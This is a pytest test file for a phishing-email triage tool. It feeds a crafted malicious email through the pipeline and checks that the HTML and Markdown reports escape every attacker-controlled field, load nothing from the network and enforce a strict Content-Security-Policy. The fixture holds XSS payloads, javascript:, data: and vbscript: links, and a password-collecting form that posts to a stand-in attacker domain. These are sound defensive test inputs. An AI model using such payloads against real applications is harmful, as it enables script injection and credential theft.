"""Everything in a phishing email is attacker-controlled. These tests put a
markup payload in every field a sender can write, render the reports, and
check the result against an allowlist of what the reports may contain: no
tag, attribute or link the report did not write itself, nothing loaded from
the network, and a Content-Security-Policy that would stop a script even if
an escaping bug let one through."""

import re
from html.parser import HTMLParser

import pytest

from phishhawk.pipeline import triage_bytes
from phishhawk.report import html, markdown

from conftest import build_eml

P = '"><svg onload=alert(1)>'

# The report's own vocabulary: every tag it writes.
ALLOWED_TAGS = {
    "html", "head", "meta", "title", "style", "body", "a", "b", "i", "q", "p", "div", "span", "header", "footer",
    "main", "nav", "section", "details", "summary", "h1", "h2", "h3", "h4", "dl", "dt", "dd", "ul", "ol", "li",
    "pre",
    "label", "input", "table", "caption", "colgroup", "col", "thead", "tbody", "tr", "th", "td", "mark",
    "svg", "defs", "lineargradient", "stop", "path", "rect", "circle", "line", "text",
}
LINK_PREFIXES = ("#", "https://attack.mitre.org/", "https://www.virustotal.com/")
LOADING_ATTRIBUTES = {"src", "srcset", "action", "formaction", "background", "poster", "data", "xlink:href"}
META = {("charset", "utf-8"), ("name", "viewport"), ("http-equiv", "Content-Security-Policy"),
        ("name", "referrer"), ("name", "color-scheme")}


@pytest.fixture(scope="module")
def hostile():
    body = ('<html><body><a href="javascript:alert(document.domain)">' + P + '</a>'
            '<a href="data:text/html,<script>alert(1)</script>">open</a>'
            '<a href="vbscript:msgbox(1)">run</a>'
            '<a href="https://evil-login.top/verify?a=' + P + '">' + P + '</a>'
            '<img src="https://tracker.evil-login.top/p.gif?' + P + '">'
            '<form action="https://evil-login.top/collect"><input type="password" name="p"></form>'
            '<div style="display:none">' + P + ' hidden text about a password reset</div>'
            '<iframe src="https://evil-login.top/frame"></iframe><script>alert(1)</script></body></html>')
    invite = ("BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nSUMMARY:" + P + "\r\nORGANIZER:mailto:x" + P
              + "@evil-login.top\r\nDESCRIPTION:https://evil-login.top/" + P
              + "\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n")
    eml = build_eml(
        subject=P, sender='"' + P + '" <ceo@evil-login.top>', to=P + " <victim@example-corp.co.uk>",
        text="see https://evil-login.top/" + P, html=body,
        headers=[("Reply-To", P + " <x@evil-login.top>"), ("Message-ID", "<" + P + "@evil-login.top>"),
                 ("Authentication-Results", P + "; spf=pass smtp.mailfrom=evil-login.top"),
                 ("Received", "from " + P + " ([203.0.113.9]) by mx" + P
                  + ".example; Mon, 1 Jan 2024 00:00:00 +0000"),
                 ("Return-Path", "<" + P + "@evil-login.top>")],
        attachments=[(b"<html><form action='https://evil-login.top/c'><input type=password></form>" + P.encode(),
                      "text", "html", P + ".html"),
                     (invite.encode(), "text", "calendar", "invite" + P + ".ics")])
    a = triage_bytes(eml, path=P + ".eml")
    assert a.urls and a.calendar and a.hops and a.attachments  # the payload reached every part of the report
    return a


class _Markup(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tags: list[tuple[str, list]] = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, attrs))

    handle_startendtag = handle_starttag


def _markup(page: str) -> list[tuple[str, list]]:
    parser = _Markup()
    parser.feed(page)
    return parser.tags


def test_no_attacker_value_becomes_markup(hostile):
    page = html.render([hostile])
    assert "<svg onload" not in page and "&quot;&gt;&lt;svg onload=alert(1)&gt;" in page
    for tag, attrs in _markup(page):
        assert tag in ALLOWED_TAGS, tag
        for name, value in attrs:
            assert not name.startswith("on"), (tag, name)
            assert name not in LOADING_ATTRIBUTES, (tag, name, value)
            if name == "href":
                assert value.startswith(LINK_PREFIXES), value
        if tag == "input":
            assert dict(attrs)["type"] in ("checkbox", "radio")
        if tag == "meta":
            assert any(pair in META for pair in attrs), attrs


def test_unsafe_url_schemes_never_become_links(hostile):
    hrefs = [v for _, attrs in _markup(html.render([hostile])) for k, v in attrs if k == "href"]
    for scheme in ("javascript:", "data:", "vbscript:", "evil-login"):
        assert not [h for h in hrefs if scheme in h], scheme


def test_the_report_loads_nothing_from_the_network(hostile):
    page = html.render([hostile])
    assert "<link" not in page and "@import" not in page
    assert not re.search(r"url\((?!data:|#)", page)  # fonts travel inside the file; #ids are the logo's own
    # every absolute URL in the page is one of the report's own reference links
    for url in re.findall(r"https?://[^\s\"'<>)]+", page):
        assert url.startswith(LINK_PREFIXES[1:]), url


def test_the_policy_blocks_scripts_forms_and_base_rewrites(hostile):
    policy = re.search(r'http-equiv="Content-Security-Policy" content="([^"]+)"', html.render([hostile])).group(1)
    for directive in ("default-src 'none'", "base-uri 'none'", "form-action 'none'", "img-src data:",
                      "font-src data:", "style-src 'unsafe-inline'"):
        assert directive in policy, directive
    assert "script-src" not in policy and "unsafe-eval" not in policy  # no script, so none is allowed


def test_markdown_keeps_hostile_text_inert(hostile):
    text = markdown.render(hostile)
    for line in text.splitlines():
        outside_code = re.sub(r"`[^`]*`", "", line)
        assert "<svg" not in outside_code and "<script" not in outside_code, line
    # the only links in the ticket note are the report's own MITRE references
    assert all(m.startswith("](https://attack.mitre.org/") for m in re.findall(r"\]\([^)]*", text))
    assert "![" not in text
